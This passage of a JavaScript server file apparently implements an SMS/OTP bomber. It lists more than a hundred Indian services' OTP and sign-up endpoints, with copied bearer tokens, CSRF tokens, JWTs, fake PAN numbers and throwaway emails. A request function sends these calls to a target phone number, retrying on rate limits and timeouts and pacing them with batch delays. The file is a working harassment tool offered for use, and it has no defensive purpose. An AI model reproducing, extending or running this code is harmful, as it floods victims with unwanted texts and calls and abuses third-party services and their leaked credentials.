            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://salarybolt.com",
            "referer": "https://salarybolt.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone })
    },

    // 66. SabkaLoan
    {
        name: "SabkaLoan",
        url: "https://api.sabkaloan.com/api/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://sabkaloan.com",
            "Referer": "https://sabkaloan.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },

    // 67. PaisaPop
    {
        name: "PaisaPop",
        url: "https://apilm.paisapop.com/api/v2/auth/send-signup",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "domain": "web.paisapop.com",
            "Origin": "https://web.paisapop.com",
            "Referer": "https://web.paisapop.com/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: "+91" + phone, email: "popbxkddndn@gmail.com", occupationTypeId: "7", monthlySalary: "538355", panCard: "FUOUR2389B", brandId: "165a2d32-d1bd-4287-b2db-104a7feee308", domain: "web.paisapop.com" })
    },

    // 68. MinutesLoan
    {
        name: "MinutesLoan",
        url: "https://apilm.minutesloan.com/api/v2/auth/send-signup",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "domain": "app.minutesloan.com",
            "Origin": "https://app.minutesloan.com",
            "Referer": "https://app.minutesloan.com/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: "+91" + phone, email: "temlsw@gmail.com", occupationTypeId: "7", monthlySalary: "55000", panCard: "ABCDE5438F", brandId: "0dbae4da-461a-4959-aa82-6a788de61593", domain: "app.minutesloan.com" })
    },

    // 69. FundoBaba
    {
        name: "FundoBaba",
        url: "https://backend.fundobaba.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://fundobaba.com",
            "Referer": "https://fundobaba.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone })
    },

    // 70. UdhaarPortal
    {
        name: "UdhaarPortal",
        url: "https://crm.udhaarportal.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "Auth": "ZTI4MTU1MzE4NWQ2MGQyZTFhNWM0NGU3M2UzMmM3MDM=",
            "Origin": "https://www.udhaarportal.com",
            "Referer": "https://www.udhaarportal.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, event_name: "login", utm_source: "", utm_medium: "", utm_campaign: "", utm_term: "", utm_content: "" })
    },

    // 71. InCred
    {
        name: "InCred",
        url: "https://gateway-api.incred.com/website-bff/public/v1/common/login/otpgenerate",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.incred.com",
            "Referer": "https://www.incred.com/"
        },
        data: (phone) => JSON.stringify({
            MOBILE: phone,
            UTM_DETAILS: { partnerId: "9250608873861026P", utm_source: "google", utm_medium: "cpc", utm_campaign: "ww_search_personal_loan_new_flow_phrase_match_kwds_ad1", utm_content: "161898739141", utm_term: "instant personal loan", gad_source: "1", gad_campaignid: "21491629100", gbraid: "0AAAAAphX73LaoflGejQFIvf-O7_s0BaY8", gclid: "EAIaIQobChMI9O--75iQkgMVn3oPAh32DgPgEAMYASAAEgKxyPD_BwE" },
            ON_BOARDING_TYPE: "FROM_LOAN_ENQUIRY",
            STATUS: "Pending"
        })
    },

    // 72. RamFincorp
    {
        name: "RamFincorp",
        url: "https://loan-api.ramfincorp.com/customers/customer-login-byMobile",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://loan.ramfincorp.com",
            "Referer": "https://loan.ramfincorp.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },

    // 73. JioSaavn (naya)
    {
        name: "JioSaavn_NEW",
        url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.jiosaavn.com",
            "Referer": "https://www.jiosaavn.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: "+91" + phone })
    },

    // 74. Cashvia
    {
        name: "Cashvia",
        url: "https://customer-backend.cashvia.in/customers/customer-login",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "client-id": "7de19504-f422-42dc-bd51-5ed5dfb170c1",
            "Origin": "https://applynow.cashvia.in",
            "Referer": "https://applynow.cashvia.in/"
        },
        data: (phone) => JSON.stringify({ phoneNo: phone, journey_down: true })
    },

    // 75. Sephora
    {
        name: "Sephora",
        url: "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==",
            "x-fp-signature": "v1.1:82658e094becb14ba6a75fcca29dd5e7f1cb0767978485c12185178ff7ad198b",
            "x-fp-date": "20260108T112314Z",
            "x-fp-sdk-version": "3.3.2",
            "Origin": "https://sephora.in",
            "Referer": "https://sephora.in/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country_code: "91" })
    },

    // 76. Moneyview
    {
        name: "Moneyview",
        url: "https://pwa.gw.moneyview.in/uis/pwa/generate-otp",
        method: "POST",
        headers: {
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymR7z7x8fbdmHNVcw",
            "Origin": "https://moneyview.in",
            "Referer": "https://moneyview.in/"
        },
        data: (phone) => `------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="key"\r\n\r\nMOBILE\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n${phone}\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="source"\r\n\r\npwa\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw--\r\n`
    },

    // 77. RojgarKaro SendOTP
    {
        name: "RojgarKaro_SendOTP",
        url: "https://rojgarkaro.in/api/auth/sendOTP",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://rojgarkaro.in",
            "Referer": "https://rojgarkaro.in/"
        },
        data: (phone) => JSON.stringify({ mobile_no: phone, isSessionActive: false })
    },

    // 78. Adview
    {
        name: "Adview",
        url: "https://adview.in/api/auth/send-otp",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://adview.in",
            "Referer": "https://adview.in/auth?ref=V7XJLX"
        },
        data: (phone) => JSON.stringify({ mobile: phone, signupPayload: { username: "User_1234", email: "test1234@gmail.com", password: "Pass@1234", confirmPassword: "Pass@1234", referralCode: "V7XJLX" } })
    },

    // 79. ServeTel
    {
        name: "ServeTel",
        url: "https://api.servetel.in/v1/auth/otp",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        data: { "_raw": "mobile_number={phone}" }
    },

    // 80. GoPink Cabs
    {
        name: "GoPink_Cabs",
        url: "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        data: { "_raw": "check_mobile_number=1&contact={phone}" }
    },

    // 81. MyHubble Money
    {
        name: "MyHubble_Money",
        url: "https://api.myhubble.money/v1/auth/otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phoneNumber: phone, channel: "SMS" })
    },

    // 82. Housing.com
    {
        name: "Housing_com",
        url: "https://login.housing.com/api/v2/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, country_url_name: "in" })
    },

    // 83. Animall
    {
        name: "Animall",
        url: "https://animall.in/zap/auth/login",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, signupPlatform: "NATIVE_ANDROID" })
    },

    // 84. Entri
    {
        name: "Entri",
        url: "https://entri.app/api/v3/users/check-phone/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone })
    },

    // 85. A23 Games
    {
        name: "A23_Games",
        url: "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone, device_id: "android123", model: "Google,Android SDK built for x86,10" })
    },

    // 86. Lifestyle Stores
    {
        name: "Lifestyle_Stores",
        url: "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ signInMobile: phone, channel: "sms" })
    },

    // 87. WorkIndia
    {
        name: "WorkIndia",
        url: "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        method: "GET",
        headers: {}
    },

    // 88. Wellness Forever
    {
        name: "Wellness_Forever",
        url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` })
    },

    // 89. HealthMug
    {
        name: "HealthMug",
        url: "https://api.healthmug.com/account/createotp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone })
    },

    // 90. Vyapar
    {
        name: "Vyapar",
        url: "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
        method: "GET",
        headers: {}
    },

    // 91. Swipe
    {
        name: "Swipe",
        url: "https://app.getswipe.in/api/user/mobile_login",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone, resend: true })
    },

    // 92. Country Delight
    {
        name: "Country_Delight",
        url: "https://api.countrydelight.in/api/v1/customer/requestOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone, platform: "Android", mode: "new_user" })
    },

    // 93. Revv
    {
        name: "Revv",
        url: "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phoneNumber: phone, appVersion: "1.0", deviceType: "website" })
    },

    // 94. PayMe India
    {
        name: "PayMe_India",
        url: "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone_number: phone, app_signature: "S10ePIIrbH3" })
    },

    // 95. SSM Jewellery
    {
        name: "SSM_Jewellery",
        url: "https://retail.ssmjewellery.in/ssmetail/index.php/mobile_api/generateOTP?mobile={phone}&email=testing@gmail.com&response_type=web&nocache=1779963941843",
        method: "GET",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "origin": "https://ssmjewellery.in",
            "x-requested-with": "via.bolte",
            "referer": "https://ssmjewellery.in/"
        }
    },

    // 96. Myntra
    {
        name: "Myntra",
        url: "https://www.myntra.com/gateway/v1/auth/getotp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.myntra.com",
            "referer": "https://www.myntra.com/login",
            "deviceid": "8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f",
            "x-myntraweb": "Yes",
            "x-requested-with": "browser",
            "x-location-context": "pincode=276304;source=IP",
            "x-meta-app": "deviceId=8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f;appFamily=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36;reqChannel=web;channel=web;",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ phoneNumber: phone, signup: "ONECLICK" })
    },

    // 97. Meesho
    {
        name: "Meesho",
        url: "https://www.meesho.com/api/v1/user/login/request-otp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "meesho-iso-country-code": "IN",
            "origin": "https://www.meesho.com",
            "referer": "https://www.meesho.com/auth",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },

    // 98. Penpencil Get OTP
    {
        name: "Penpencil_GetOTP",
        url: "https://api.penpencil.co/v1/users/get-otp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "client": "hasura",
            "client_type": "WEB",
            "origin": "https://store.pw.live",
            "referer": "https://store.pw.live/",
            "randomid": "d6c503fb-9ed9-ee6d-ddde-319d99b08793",
            "suborgid": "SUB-PWST002",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "version": "0.0.1"
        },
        data: (phone) => JSON.stringify({ username: phone, countryCode: "+91", organizationId: "5eb393ee95fab7468a79d189" })
    },

    // 99. AstroTalk SMS
    {
        name: "AstroTalk_SMS",
        url: "https://api.prod.astrotalk.in/AstroTalk/v2/login/user/mobile-otp-login",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "origin": "https://astrotalk.com",
            "referer": "https://astrotalk.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ countryCode: "91", isCall: "false", appId: "4", businessId: "1", mobile: phone, captcha: "", isTermsAndConditionAccepted: "false" })
    },

    // 100. AstroTalk Call
    {
        name: "AstroTalk_Call",
        url: "https://api.prod.astrotalk.in/AstroTalk/v2/login/user/mobile-otp-login",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "origin": "https://astrotalk.com",
            "referer": "https://astrotalk.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ countryCode: "91", isCall: "true", appId: "4", businessId: "1", mobile: phone, captcha: "", isTermsAndConditionAccepted: "false" })
    },

    // 101. VishalMegaMart
    {
        name: "VishalMegaMart",
        url: "https://www.vishalmegamart.com/on/demandware.store/Sites-vishalmegamart-Site/en_IN/Account-Login?rurl=1",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.vishalmegamart.com",
            "referer": "https://www.vishalmegamart.com/en-in/login",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        data: (phone) => ({ "_raw": `rurl=1&phoneNumber=${phone}&csrf_token=J2-WQXQFJPocq87BLrVQ6fdufGbRp29B7iYyvhUpT_vvUz2-rgsa9pXefal3abcRMAodfNb6moh9inOkBC5qNzFvEqsodoVBGfXd_yzzCPPV7BXdEvt2LIC6s-yjFMk9dQEBuyBEMttbrDui5iVw7DVjBhEp6YT6aC7xvmKTuF4g2t_PUT4=` })
    },

    // 102. BigBasket
    {
        name: "BigBasket",
        url: "https://www.bigbasket.com/member-tdl/v3/member/otp",
        method: "POST",
        headers: {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://www.bigbasket.com",
            "referring-client": "https://www.bigbasket.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-caller": "Monster-SVC",
            "x-channel": "BB-WEB",
            "x-csrftoken": "5HzTMAgBjUqonkm556PB3B4fydUy1Ajb8jKF1546o5SXSOZq4gJCBC6qJZXCtM7J",
            "x-csurftoken": "yi9Atw.MTE2MTgwODg4NDcwNTU0OTU1MA==.1773316406412.NDwQUuYPiOig7eIOPcu5di8sEgPAwrVPh+EZqtnowP4=",
            "x-entry-context": "bbnow",
            "x-entry-context-id": "10",
            "x-timestamp": "1773316435",
            "x-tracker": "4f107fe4-a165-4de2-82d0-ddf89589b164"
        },
        data: (phone) => JSON.stringify({ identifier: phone, recaptchaToken: "dummy_token", referrer: "unified_login" })
    },

    // 103. Naaptol
    {
        name: "Naaptol",
        url: "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.naaptol.com",
            "pagesecuritytoken": "DE3NzMzMTY2NTY3NTZfVkBAcHRvbF83MzA1ODUyba",
            "referer": "https://www.naaptol.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        data: (phone) => ({ "actionname": "checkMobileUserExistsForTvApp", "mobile": phone })
    },

    // 104. IndiaMart
    {
        name: "IndiaMart_New",
        url: "https://m.indiamart.com/ajaxrequest/identified/common/login",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://m.indiamart.com",
            "referer": "https://m.indiamart.com/login/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ GEOIP_COUNTRY_ISO: "IN", IP: "47.9.35.50", IPADDRESS: "47.9.35.50", IP_COUNTRY: "India", ciso: "IN", duplicateEmailCheck: "", glid: "", glusr_usr_ip: "47.9.35.50", originalreferer: "https://m.indiamart.com/login/", pass: "", ph_code: "91", use: phone })
    },

    // 105. Ajio
    {
        name: "Ajio_New",
        url: "https://login.web.ajio.com/api/auth/signupSendOTP",
        method: "POST",
        headers: {
            "accept": "application/json",
            "content-type": "application/json",
            "referer": "https://www.ajio.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ firstName: "hgr", genderType: "Male", login: "myolnir123@gmail.com", mobileNumber: phone, newDesign: false, requestType: "SENDOTP", rilFnlRegisterReferralCode: "" })
    },

    // 106. RelianceRetail New
    {
        name: "RelianceRetail_New",
        url: "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
        method: "POST",
        headers: {
            "accept": "application/json",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI1LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzczMzE3Nzg4LCJzYWx0IjowfQ.DLFEXcyozGInRiLn3U2dTGQEwTog6UYc3WP62ujmJGY",
            "content-type": "application/json",
            "origin": "https://account.relianceretail.com",
            "referer": "https://account.relianceretail.com/",
            "source_meta": '{"source_id":null,"device_fingerprint":"32fbac4f-6e64-47-eyJwbGF0Zm9ybSI6","os_name":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36","timestamp":"2026-03-12T12:16:39.117Z"}'
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },

    // 107. Snapdeal New
    {
        name: "Snapdeal_New",
        url: "https://www.snapdeal.com/isUserExists",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.snapdeal.com",
            "referer": "https://www.snapdeal.com/login",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        data: (phone) => JSON.stringify({ userName: phone })
    },

    // 108. Gokwik New
    {
        name: "Gokwik_New",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc3MzMxODk3NiwiZXhwIjoxNzczMzE5MDM2fQ.JzLZU2gjI0EBtokMC08rF20PCf4nL-NxxmoxXzHb6Dc",
            "content-type": "application/json",
            "gk-merchant-id": "19g6ilhzwnelw",
            "gk-platform": "shopify",
            "gk-request-id": "44fa696d-db10-4fb4-8b31-84baaeb0c3aa",
            "gk-signature": "394259",
            "gk-timestamp": "59110632",
            "gk-udf-1": "4479",
            "gk-version": "20260305172819153",
            "origin": "https://pdp.gokwik.co",
            "referer": "https://pdp.gokwik.co/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },

    // 109. 1MG
    {
        name: "1MG_New",
        url: "https://www.1mg.com/pwa-dweb-api/auth/create_token",
        method: "POST",
        headers: {
            "accept": "application/vnd.healthkartplus.v4+json",
            "content-type": "application/json",
            "hkp-platform": "Healthkartplus-0.0.1-desktopweb",
            "locale": "en",
            "origin": "https://www.1mg.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "visitor-id": "3db32040-6706-4b0a-b063-8aa5fa55b224_zkmwX3acYQ_0579_1773319167588",
            "x-1mglabs-platform": "dWeb",
            "x-access-key": "1mg_client_access_key",
            "x-city": "New Delhi",
            "x-platform": "desktop-0.0.1",
            "x-visitor-id": "3db32040-6706-4b0a-b063-8aa5fa55b224_zkmwX3acYQ_0579_1773319167588"
        },
        data: (phone) => JSON.stringify({ phone: phone })
    },

    // 110. Apollo247
    {
        name: "Apollo247",
        url: "https://apigateway.apollo247.in/auth-service/generateOtp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "authorization": "Bearer 3d1833da7020e0602165529446587434",
            "content-type": "application/json",
            "origin": "https://www.apollopharmacy.in",
            "referer": "https://www.apollopharmacy.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-apollo-pre-auth-key": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZGVudGlmaWVyIjoiYTExN2NjMmZiMWIzMzAzZDhlOGY1NWZmMzBiNWUxMWY1YmZmZTFlMzFkMzcyZmM5MzJiNDc1MDk1NTIyYTFlZSIsImlzc3VlZEF0IjoxNzczMzE5MzQzODMyLCJkZXZpY2VJZCI6IkRlc2t0b3AiLCJpc3MiOiJBcG9sbG8yNDciLCJpYXQiOjE3NzMzMTkzNDMsImV4cCI6MTc3MzQwNTc0M30.CoFcO8xi4TS5ztxK2M7EvUrky2lBYcGbwN6yYP0JbRk8nqdEYLuD9TO1xNSVOGZ3z2DtiSfRQO7Zx1ih_LU1ZEwqxu_DIcj2snkYOAHxEStP5CmURJ3mzFmykfZTb-0ijfCnHKRdBGyZYqyXSaim3ruh-DEcHJGMTAS4CB4hTo7OQx4LffBFQiRPvqLL3jP0en-2dH_ZVVUz5cEEcvQ7SUW1pb8zHP99eOVlYSIxy5R_e8DtqxXnyehHf6Tz2KAMRGnT177yL7i8yB3JviHVksO5tKLUMwdSVA8_4WquIiUX3F0TsELdHwbQtojKID7E4oFojnP0O7J4Dr9kpdBW-g",
            "x-app-device-id": "Desktop",
            "x-app-os": "web"
        },
        data: (phone) => JSON.stringify({ loginType: "PATIENT", mobileNumber: "+91" + phone })
    },

    // 111. Blinkit
    {
        name: "Blinkit",
        url: "https://blinkit.com/v2/accounts/",
        method: "POST",
        headers: {
            "accept": "*/*",
            "app_client": "consumer_web",
            "app_version": "52434332",
            "auth_key": "c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477",
            "content-type": "application/x-www-form-urlencoded",
            "device_id": "b237ca6ed1de853b",
            "lat": "28.4465616",
            "lon": "77.040489",
            "origin": "https://blinkit.com",
            "platform": "mobile_web",
            "referer": "https://blinkit.com/",
            "rn_bundle_version": "1009003012",
            "session_uuid": "4e9e04b8-b407-484c-b37e-7f3f2b9f19b6",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "web_app_version": "1008010016"
        },
        data: (phone) => ({ "user_phone": phone })
    },

    // 112. CityMall New
    {
        name: "CityMall_Web",
        url: "https://citymall.live/web-api/auth/send-otp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "host": "citymall.live",
            "origin": "https://citymall.live",
            "referer": "https://citymall.live/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },

    // 113. Apna New
    {
        name: "Apna_New",
        url: "https://production.apna.co/api/userprofile/v1/otp/",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://employer.apna.co",
            "referer": "https://employer.apna.co/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ phone_number: "91" + phone, retries: 0, hash_type: "employer", source: "employer" })
    }
];

console.log(`✅ Loaded ${APIS.length} untested APIs`);
console.log(`⏱️  Max duration cap: ${MAX_DURATION_MIN} minutes`);
console.log(`⏳ API delay: ${API_DELAY_MS}ms | Batch delay: ${BATCH_DELAY_MS}ms`);

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) {
        return JSON.stringify({ mobile: phone });
    }
    if (lower.includes('whatsapp')) {
        return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    }
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') {
                    rawData = rawData.replace(/{phone}/g, phone);
                }
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) {
                            newObj[key] = replacePhone(obj[key]);
                        }
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: 5000,
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) {
                    headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        return { status: response.status, success: true, responseTime };
    } catch (err) {
        const responseTime = Date.now() - startTime;
        
        const isRateLimit = err.response && err.response.status === 429;
        
        if (isRateLimit && api.rateLimit && retryCount < 3) {
            console.log(`  🚫 ${api.name} → 429 RATE_LIMITED, retrying in 3s (${retryCount + 1}/3)...`);
            await new Promise(r => setTimeout(r, 3000));
            return makeApiCall(api, phone, retryCount + 1);
        }
        
        if (retryCount < 1 && 
            (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }
        
        let statusCode = null;
        if (err.response) statusCode = err.response.status;
        
        return { status: statusCode, success: false, responseTime };
    }
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        total_apis: APIS.length,
        mode: 'UNTESTED APIs ONLY',
        max_duration_min: MAX_DURATION_MIN,
